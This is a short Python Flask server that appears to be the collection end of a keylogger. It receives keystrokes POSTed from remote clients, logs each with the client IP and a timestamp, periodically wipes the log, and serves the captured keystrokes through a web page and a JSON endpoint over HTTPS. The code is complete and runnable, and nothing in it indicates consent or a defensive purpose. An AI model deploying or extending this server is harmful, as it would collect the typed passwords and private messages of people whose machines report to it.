from flask import Flask, request, jsonify, render_template
import datetime
import os

app = Flask(__name__)

# Log file location
log_file_path = './logs/keystroke_logs.txt'

# Ensure the logs directory exists
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

@app.route('/api/log', methods=['POST'])
def log_key():
    keystroke = request.form['keystroke']
    client_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_entry = f"[{timestamp}] {client_ip} - Keystroke: {keystroke}"
    print(log_entry)

    # Append the log entry to the file
    with open(log_file_path, 'a') as log_file:
        log_file.write(log_entry + '\n')

    # Check if the log file exceeds 100 lines and wipe it if it does
    with open(log_file_path, 'r') as log_file:
        logs = log_file.readlines()

    if len(logs) >= 100:
        with open(log_file_path, 'w') as log_file:
            log_file.write('')  

    return '', 200

@app.route('/', methods=['GET'])
def show_logs():
    logs = []

    # Read logs from the file
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r') as log_file:
            logs = log_file.readlines()
            logs.reverse() 

    return render_template('logs.html', logs=logs)

@app.route('/api/logs', methods=['GET'])
def get_logs():
    logs = []

    # Read logs from the file
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r') as log_file:
            logs = log_file.readlines()
            logs.reverse() 

    return jsonify(logs=[log.strip() for log in logs])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context=('certs/cert.pem', 'certs/key.pem'))
